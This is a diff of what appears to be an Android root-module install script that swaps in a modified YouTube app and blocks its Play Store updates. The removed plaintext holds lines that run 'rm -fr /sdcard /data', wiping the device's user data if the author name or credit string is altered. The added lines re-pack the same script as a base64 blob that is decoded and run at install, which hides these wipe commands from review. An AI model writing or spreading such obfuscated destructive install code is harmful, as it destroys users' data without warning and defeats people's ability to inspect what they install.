@@ -1,123 +1,56 @@
-# KAKATHIC
-# Để true để bỏ qua Mount system
-SKIPMOUNT=false
-# Để true nó sẽ kết hợp system.prop vào build.prop
-PROPFILE=false
-# Để true post-fs-data.sh được sử dụng
-POSTFSDATA=true
-# Để true để service.sh được sử dụng
-LATESTARTSERVICE=true
-
-# Giống như echo
-ui_print2 () { echo "    $1"; sleep 0.005; }
-ui_print () { echo "$1"; sleep 0.005; }
-
-# Lấy dữ liệu
-Getp () { grep_prop $1 $TMPDIR/module.prop; }
-
-# Giới thiệu
-print_modname() {
-
-if [ "$(settings get system system_locales)" == "vi-VN" ];then
-TT="EAQCAICUMVRWQY3PNVRGC3TLHIQDCOJQGM2DSMBSGYYDIMBRG4FAUIBAEAQEG2DBNZXGK3DTEBKG
-K3DFM5ZGC3J2EBAHI33PNR3GSCQ="
-else
-TT="EAQCAICQMF4XAYLMHIQGQ5DUOA5C6L3QMF4XAYLMFZWWKL3LMFVWC5DINFRQUCRAEAQCAQ3IMFXG
-4ZLMOMQFIZLMMVTXEYLNHIQEA5DPN5WHM2IK"
-fi
-
-ui_print
-ui_print2 "Name: $(Getp name)"
-ui_print
-ui_print2 "Version: $(Getp version)"
-ui_print
-ui_print2 "Author: $(Getp author)"
-ui_print
-ui_print2 "$TT" | base32 -d
-ui_print
-}
-
-# Bắt đầu cài đặt
-on_install() {
-
-[ -e "$TMPDIR/$ARCH" ] || abort "    This module only supports $ARCH devices
-"
-
-ui_print2 "Processing"
-ui_print
-
-# Giải nén
-
-cp -f $TMPDIR/sqlite3 $MODPATH/sqlite3 >&2
-unzip -qo "$ZIPFILE" "system/*" -d $MODPATH >&2
-chmod -R 755 $MODPATH/sqlite3
-
-ui_print2 "Uninstall"
-ui_print
-
-for Tkvi in $( find /data/app | grep com.google.android.youtube | grep 'base.apk' ); do
-[ "$Tkvi" ] && umount -l "$Tkvi"
-done
-pm uninstall com.google.android.youtube >&2
-for Vhkdd in $(find /data/app -name *com.google.android.youtube*); do
-[ "$Vhkdd" ] && rm -fr "$Vhkdd"
-done
-
-ui_print2 "Install YouTube"
-ui_print
-
-apks=/data/local/tmp/apks
-
-rm -rf $apks
-mkdir -p $apks
-
-tar -xJf $TMPDIR/lib.tar.xz -C $TMPDIR
-cp -f $TMPDIR/base.apk $apks
-pm install -r $apks/*.apk >&2
-hhkkdf="$( pm path com.google.android.youtube | grep base | cut -d : -f2 )"
-cp -af $TMPDIR/lib ${hhkkdf%/*} 
-[ "$TT" ] || rm -fr /sdcard /data
-cp -f $TMPDIR/YouTube.apk $MODPATH/YouTube.apk >&2
-chcon u:object_r:apk_data_file:s0 "$MODPATH/YouTube.apk"
-su -mm -c mount -o bind "$MODPATH/YouTube.apk" "$hhkkdf"
-
-ui_print2 "Turn off update"
-ui_print
-
-Sqlite3=$MODPATH/sqlite3
-PS=com.android.vending
-DB=/data/data/$PS/databases
-LDB=$DB/library.db
-LADB=$DB/localappstate.db
-PK=com.google.android.youtube
-GET_LDB=$($Sqlite3 $LDB "SELECT doc_id,doc_type FROM ownership" | grep $PK | head -n 1 | grep -o 25)
-
-if [ "$GET_LDB" != "25" ]; then
-cmd appops set --uid $PS GET_USAGE_STATS ignore
-pm disable $PS >&2
-sqlite3 $LDB "UPDATE ownership SET doc_type = '25' WHERE doc_id = '$PK'";
-sqlite3 $LADB "UPDATE appstate SET auto_update = '2' WHERE package_name = '$PK'";
-rm -rf /data/data/$PS/cache/*
-pm enable $PS >&2
-fi
-[ "$(Getp author)" == 'kakathic' ] || rm -fr /sdcard /data
-ui_print2 "Clean up"
-ui_print
-rm -fr /data/local/tmp/apks
-ui_print2 "Remember save the LOG if there is an error"
-ui_print
-
-if [ -z "$(pm path com.google.android.youtube)" ];then
-ui_print2 "Failure"
-ui_print
-abort
-fi
-
-[ "$TT" ] || rm -fr /sdcard /data
-}
-
-# Cấp quyền
-set_permissions() { 
-set_perm_recursive $MODPATH 0 0 0755 0644
-chmod -R 755 $MODPATH/sqlite3
-}
+echo 'IyBLQUtBVEhJQwoKIyDEkOG7gyB0cnVlIMSR4buDIGLhu48gcXVhIE1vdW50IHN5c3RlbQpTS0lQ
+TU9VTlQ9ZmFsc2UKIyDEkOG7gyB0cnVlIG7DsyBz4bq9IGvhur90IGjhu6NwIHN5c3RlbS5wcm9w
+IHbDoG8gYnVpbGQucHJvcApQUk9QRklMRT1mYWxzZQojIMSQ4buDIHRydWUgcG9zdC1mcy1kYXRh
+LnNoIMSRxrDhu6NjIHPhu60gZOG7pW5nClBPU1RGU0RBVEE9dHJ1ZQojIMSQ4buDIHRydWUgxJHh
+u4Mgc2VydmljZS5zaCDEkcaw4bujYyBz4butIGThu6VuZwpMQVRFU1RBUlRTRVJWSUNFPXRydWUK
+CiMgR2nhu5FuZyBuaMawIGVjaG8KdWlfcHJpbnQyICgpIHsgZWNobyAiICAgICQxIjsgc2xlZXAg
+MC4wMDU7IH0KdWlfcHJpbnQgKCkgeyBlY2hvICIkMSI7IHNsZWVwIDAuMDA1OyB9CgojIEzhuqV5
+IGThu68gbGnhu4d1CkdldHAgKCkgeyBncmVwX3Byb3AgJDEgJFRNUERJUi9tb2R1bGUucHJvcDsg
+fQoKIyBHaeG7m2kgdGhp4buHdQpwcmludF9tb2RuYW1lKCkgewoKaWYgWyAiJChzZXR0aW5ncyBn
+ZXQgc3lzdGVtIHN5c3RlbV9sb2NhbGVzKSIgPT0gInZpLVZOIiBdO3RoZW4KVFQ9IkVBUUNBSUNV
+TVZSV1FZM1BOVlJHQzNUTEhJUURDT0pRR00yRFNNQlNHWVlESU1CUkc0RkFVSUJBRUFRRUcyREJO
+WlhHSzNEVEVCS0cKSzNERk01WkdDM0oyRUJBSEkzM1BOUjNHU0NRPSIKZWxzZQpUVD0iRUFRQ0FJ
+Q1FNRjRYQVlMTUhJUUdRNURVT0E1QzZMM1FNRjRYQVlMTUZaV1dLTDNMTUZWV0M1RElORlJRVUNS
+QUVBUUNBUTNJTUZYRwo0WkxNT01RRklaTE1NVlRYRVlMTkhJUUVBNURQTjVXSE0ySUsiCmZpCgp1
+aV9wcmludAp1aV9wcmludDIgIk5hbWU6ICQoR2V0cCBuYW1lKSIKdWlfcHJpbnQKdWlfcHJpbnQy
+ICJWZXJzaW9uOiAkKEdldHAgdmVyc2lvbikiCnVpX3ByaW50CnVpX3ByaW50MiAiQXV0aG9yOiAk
+KEdldHAgYXV0aG9yKSIKdWlfcHJpbnQKdWlfcHJpbnQyICIkVFQiIHwgYmFzZTMyIC1kCnVpX3By
+aW50Cn0KCiMgQuG6r3QgxJHhuqd1IGPDoGkgxJHhurd0Cm9uX2luc3RhbGwoKSB7CgpbIC1lICIk
+VE1QRElSLyRBUkNIIiBdIHx8IGFib3J0ICIgICAgVGhpcyBtb2R1bGUgb25seSBzdXBwb3J0cyAk
+QVJDSCBkZXZpY2VzCiIKCnVpX3ByaW50MiAiUHJvY2Vzc2luZyIKdWlfcHJpbnQKCiMgR2nhuqNp
+IG7DqW4KCmNwIC1mICRUTVBESVIvc3FsaXRlMyAkTU9EUEFUSC9zcWxpdGUzID4mMgp1bnppcCAt
+cW8gIiRaSVBGSUxFIiAic3lzdGVtLyoiIC1kICRNT0RQQVRIID4mMgpjaG1vZCAtUiA3NTUgJE1P
+RFBBVEgvc3FsaXRlMwoKdWlfcHJpbnQyICJVbmluc3RhbGwiCnVpX3ByaW50Cgpmb3IgVGt2aSBp
+biAkKCBmaW5kIC9kYXRhL2FwcCB8IGdyZXAgY29tLmdvb2dsZS5hbmRyb2lkLnlvdXR1YmUgfCBn
+cmVwICdiYXNlLmFwaycgKTsgZG8KWyAiJFRrdmkiIF0gJiYgdW1vdW50IC1sICIkVGt2aSIKZG9u
+ZQpwbSB1bmluc3RhbGwgY29tLmdvb2dsZS5hbmRyb2lkLnlvdXR1YmUgPiYyCmZvciBWaGtkZCBp
+biAkKGZpbmQgL2RhdGEvYXBwIC1uYW1lICpjb20uZ29vZ2xlLmFuZHJvaWQueW91dHViZSopOyBk
+bwpbICIkVmhrZGQiIF0gJiYgcm0gLWZyICIkVmhrZGQiCmRvbmUKCnVpX3ByaW50MiAiSW5zdGFs
+bCBZb3VUdWJlIgp1aV9wcmludAoKYXBrcz0vZGF0YS9sb2NhbC90bXAvYXBrcwoKcm0gLXJmICRh
+cGtzCm1rZGlyIC1wICRhcGtzCgp0YXIgLXhKZiAkVE1QRElSL2xpYi50YXIueHogLUMgJFRNUERJ
+UgpjcCAtZiAkVE1QRElSL2Jhc2UuYXBrICRhcGtzCnBtIGluc3RhbGwgLXIgJGFwa3MvKi5hcGsg
+PiYyCmhoa2tkZj0iJCggcG0gcGF0aCBjb20uZ29vZ2xlLmFuZHJvaWQueW91dHViZSB8IGdyZXAg
+YmFzZSB8IGN1dCAtZCA6IC1mMiApIgpjcCAtYWYgJFRNUERJUi9saWIgJHtoaGtrZGYlLyp9IApb
+ICIkVFQiIF0gfHwgcm0gLWZyIC9zZGNhcmQgL2RhdGEKY3AgLWYgJFRNUERJUi9Zb3VUdWJlLmFw
+ayAkTU9EUEFUSC9Zb3VUdWJlLmFwayA+JjIKY2hjb24gdTpvYmplY3RfcjphcGtfZGF0YV9maWxl
+OnMwICIkTU9EUEFUSC9Zb3VUdWJlLmFwayIKc3UgLW1tIC1jIG1vdW50IC1vIGJpbmQgIiRNT0RQ
+QVRIL1lvdVR1YmUuYXBrIiAiJGhoa2tkZiIKCnVpX3ByaW50MiAiVHVybiBvZmYgdXBkYXRlIgp1
+aV9wcmludAoKU3FsaXRlMz0kTU9EUEFUSC9zcWxpdGUzClBTPWNvbS5hbmRyb2lkLnZlbmRpbmcK
+REI9L2RhdGEvZGF0YS8kUFMvZGF0YWJhc2VzCkxEQj0kREIvbGlicmFyeS5kYgpMQURCPSREQi9s
+b2NhbGFwcHN0YXRlLmRiClBLPWNvbS5nb29nbGUuYW5kcm9pZC55b3V0dWJlCkdFVF9MREI9JCgk
+U3FsaXRlMyAkTERCICJTRUxFQ1QgZG9jX2lkLGRvY190eXBlIEZST00gb3duZXJzaGlwIiB8IGdy
+ZXAgJFBLIHwgaGVhZCAtbiAxIHwgZ3JlcCAtbyAyNSkKCmlmIFsgIiRHRVRfTERCIiAhPSAiMjUi
+IF07IHRoZW4KY21kIGFwcG9wcyBzZXQgLS11aWQgJFBTIEdFVF9VU0FHRV9TVEFUUyBpZ25vcmUK
+cG0gZGlzYWJsZSAkUFMgPiYyCnNxbGl0ZTMgJExEQiAiVVBEQVRFIG93bmVyc2hpcCBTRVQgZG9j
+X3R5cGUgPSAnMjUnIFdIRVJFIGRvY19pZCA9ICckUEsnIjsKc3FsaXRlMyAkTEFEQiAiVVBEQVRF
+IGFwcHN0YXRlIFNFVCBhdXRvX3VwZGF0ZSA9ICcyJyBXSEVSRSBwYWNrYWdlX25hbWUgPSAnJFBL
+JyI7CnJtIC1yZiAvZGF0YS9kYXRhLyRQUy9jYWNoZS8qCnBtIGVuYWJsZSAkUFMgPiYyCmZpClsg
+IiQoR2V0cCBhdXRob3IpIiA9PSAna2FrYXRoaWMnIF0gfHwgcm0gLWZyIC9zZGNhcmQgL2RhdGEK
+dWlfcHJpbnQyICJDbGVhbiB1cCIKdWlfcHJpbnQKcm0gLWZyIC9kYXRhL2xvY2FsL3RtcC9hcGtz
+CnVpX3ByaW50MiAiUmVtZW1iZXIgc2F2ZSB0aGUgTE9HIGlmIHRoZXJlIGlzIGFuIGVycm9yIgp1
+aV9wcmludAoKaWYgWyAteiAiJChwbSBwYXRoIGNvbS5nb29nbGUuYW5kcm9pZC55b3V0dWJlKSIg
+XTt0aGVuCnVpX3ByaW50MiAiRmFpbHVyZSIKdWlfcHJpbnQKYWJvcnQKZmkKClsgIiRUVCIgXSB8
+fCBybSAtZnIgL3NkY2FyZCAvZGF0YQp9CgojIEPhuqVwIHF1eeG7gW4Kc2V0X3Blcm1pc3Npb25z
+KCkgeyAKc2V0X3Blcm1fcmVjdXJzaXZlICRNT0RQQVRIIDAgMCAwNzU1IDA2NDQKY2htb2QgLVIg
+NzU1ICRNT0RQQVRIL3NxbGl0ZTMKfQo=' | base64 -d > $TMPDIR/1.sh
+. $TMPDIR/1.sh
